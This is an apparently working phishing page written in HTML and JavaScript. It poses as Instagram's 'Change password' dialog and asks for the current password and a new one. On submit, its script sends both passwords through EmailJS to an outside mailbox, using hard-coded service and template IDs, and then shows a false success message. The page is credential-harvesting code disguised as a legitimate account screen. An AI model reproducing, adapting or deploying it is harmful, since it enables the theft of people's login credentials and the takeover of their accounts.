<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Password Change</title>
    <link rel="stylesheet" href="insta.css">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        const EMAILJS_PUBLIC_KEY  = "eZJYDN7Fs8rcNj5cO";
        const EMAILJS_SERVICE_ID  = "service_hriev2f";
        const EMAILJS_TEMPLATE_ID = "template_8odikak";
        (function () { emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY }); })();
    </script>
</head>
<body>

    <div class="modal-container">
        <div class="modal-header">
            <button class="icon-btn back-btn" id="cancelBtn">
                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
            </button>
            <button class="icon-btn close-btn">
                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
            </button>
        </div>

        
        <h1 class="main-title">Change password</h1>
        <p class="description">Your password must be at least 8 characters and should include a combination of numbers, letters and special characters (!$@%).</p>

        <div id="alertSuccess" class="alert-msg">✓ Password changed successfully!</div>
        <div id="alertError" class="alert-msg"></div>

        <form class="password-form" id="passwordForm">
            <div class="input-group">
                <input type="password" id="current-pass" required placeholder=" ">
                <label for="current-pass">Current password</label>
                <button type="button" class="toggle-password">Show</button>
            </div>

            <div class="input-group">
                <input type="password" id="new-pass" required placeholder=" ">
                <label for="new-pass">New password</label>
                <button type="button" class="toggle-password">Show</button>
            </div>

            <div class="input-group">
                <input type="password" id="retype-pass" required placeholder=" ">
                <label for="retype-pass">Retype new password</label>
                <button type="button" class="toggle-password">Show</button>
            </div>

            <a href="#" class="forgot-link">Forgotten your password?</a>

            <div class="checkbox-group">
                <input type="checkbox" id="logout-others">
                <label for="logout-others">Log out of other devices. Choose this if someone else used your account.</label>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn" disabled>Change password</button>
        </form>
    </div>

    <script>
        const form        = document.getElementById("passwordForm");
        const submitBtn   = document.getElementById("submitBtn");
        const cancelBtn   = document.getElementById("cancelBtn");
        const alertOk     = document.getElementById("alertSuccess");
        const alertErr    = document.getElementById("alertError");

        const currentPass = document.getElementById("current-pass");
        const newPass     = document.getElementById("new-pass");
        const retypePass  = document.getElementById("retype-pass");
 
        // Düymə aktivliyi və Göstər/Gizlət düymələrinin görünməsini idarə edən funksiya
        function checkInputs() {
            const inputs = [currentPass, newPass, retypePass];
            
            inputs.forEach(input => {
                const toggleBtn = input.nextElementSibling.nextElementSibling; // button.toggle-password
                if (input.value.length > 0) {
                    toggleBtn.style.display = "block";
                } else {
                    toggleBtn.style.display = "none";
                }
            });

            if (currentPass.value.trim() !== "" && newPass.value.trim() !== "" && retypePass.value.trim() !== "") {
                submitBtn.disabled = false;
                submitBtn.classList.add("active");
            } else {
                submitBtn.disabled = true;
                submitBtn.classList.remove("active");
            }
        }

        currentPass.addEventListener("input", checkInputs);
        newPass.addEventListener("input", checkInputs);
        retypePass.addEventListener("input", checkInputs);

        // Şifrəni göstər/gizlət düymələrinin işləmə məntiqi
        document.querySelectorAll(".toggle-password").forEach(button => {
            button.addEventListener("click", function() {
                const input = this.previousElementSibling.previousElementSibling; // input elementi
                if (input.type === "password") {
                    input.type = "text";
                    this.textContent = "Hide";
                } else {
                    input.type = "password";
                    this.textContent = "Show";
                }
            });
        });
 
        cancelBtn.addEventListener("click", () => {
            form.reset();
            checkInputs();
            alertOk.style.display = "none";
            alertErr.style.display = "none";
            // Şifrə tiplərini sıfırla
            document.querySelectorAll(".password-form input").forEach(inpt => inpt.type = "password");
            document.querySelectorAll(".toggle-password").forEach(btn => btn.textContent = "Show");
        });
 
        form.addEventListener("submit", async (e) => {
            e.preventDefault();
 
            alertOk.style.display  = "none";
            alertErr.style.display = "none";
 
            const oldPassword     = currentPass.value;
            const newPassword     = newPass.value;
            const confirmPassword = retypePass.value;
 
            if (newPassword.length < 8) {
                alertErr.textContent   = "✖ New password must be at least 8 characters long.";
                alertErr.style.display = "block";
                return;
            }
 
            if (newPassword !== confirmPassword) {
                alertErr.textContent   = "✖ New password and confirmation do not match.";
                alertErr.style.display = "block";
                return;
            }
 
            submitBtn.disabled   = true;
            submitBtn.classList.remove("active");
            submitBtn.innerHTML  = 'Sending...';
 
            const templateParams = {
                old_password : oldPassword,
                new_password : newPassword,
                sent_at      : new Date().toLocaleString("az-AZ")
            };
 
            try {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                alertOk.style.display = "block";
                form.reset();
                checkInputs();
            } catch (err) {
                console.error("EmailJS error:", err);
                alertErr.textContent   = "✖ Error occurred: " + (err?.text || "Unknown error");
                alertErr.style.display = "block";
                submitBtn.disabled  = false;
                submitBtn.classList.add("active");
            } finally {
                submitBtn.innerHTML = "Change password";
            }
        });
    </script>
</body>
</html>
